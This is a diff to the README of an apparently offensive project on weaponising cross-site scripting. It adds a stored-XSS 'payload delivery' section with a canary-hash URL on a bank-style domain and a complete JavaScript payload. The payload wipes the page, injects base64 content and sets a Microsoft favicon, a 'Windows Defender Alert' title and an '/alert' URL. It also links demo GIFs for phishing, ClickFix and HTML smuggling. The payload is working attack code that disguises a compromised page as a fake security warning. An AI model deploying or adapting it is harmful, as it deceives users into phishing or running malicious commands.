@@ -110,17 +110,22 @@ The vulnerable application already has its CSS styles and DOM content loaded (in
 
 ### I - Clickfix
 
-![phishing](assets/clickfix.gif)
+![clickfix](assets/clickfix.gif)
 
 ### I - HTML Smuggling
 
-![phishing](assets/smuggling.gif)
+![smuggling](assets/smuggling.gif)
 
 ## Type II - Stored XSS
 Weaponizing Stored XSS - Persistent. This type of XSS occurs when user input is stored on target server e.g. database and requires no the user interaction to trigger the javascript code.
 
 ### II - Payload Delivery
+In reflected XSS, the attacker needs to send the victim a file or a link containing the payload to trigger the attack. With stored XSS, it's even simpler the victim just needs to visit a specific page. However, in order to not "brake" the whole page we need a way to identify the targeted user using a canary hash. For example:
+```url
+https://client.bank.com/?b01829f1f013fe3bf52f026d6e053a7a
+```
 
+Using the above we can create a simple statement. If the canary exists in URL then trigger the javascript if not do nothing. e.g.
 
 ```javascript
 if (window.location.search.replace("?","") === "b01829f1f013fe3bf52f026d6e053a7a"){
@@ -130,11 +135,32 @@ if (window.location.search.replace("?","") === "b01829f1f013fe3bf52f026d6e053a7a
 }
 ```
 
+Final payload should look like this:
+```javascript
+if (window.location.search.replace("?","") === "b01829f1f013fe3bf52f026d6e053a7a"){
+    [...document.querySelectorAll('link[rel="stylesheet"]')].map(l => l.remove());
+
+    document.body.innerHTML=atob("<base64>data.");
+
+    (document.querySelector("link[rel~='icon']") || Object.assign(document.head.appendChild(document.createElement('link')), {rel:'icon'})).href = 'https://www.microsoft.com/favicon.ico?v2';
+
+    document.getElementsByTagName('title')[0].innerHTML = 'Windows Defender Alert';
+
+    history.replaceState(null, null, '../../../alert');
+} else {}
+```
+
 ### II - Phishing
+
+![phishing](assets/iiphishing.gif)
 
 ### II - Clickfix
 
+![clickfix](assets/iiclickfix.gif)
+
 ### II - HTML Smuggling
+
+![smuggling](assets/iismuggling.gif)
 
 ## Type-0 - DOM Based XSS
 "Future work"
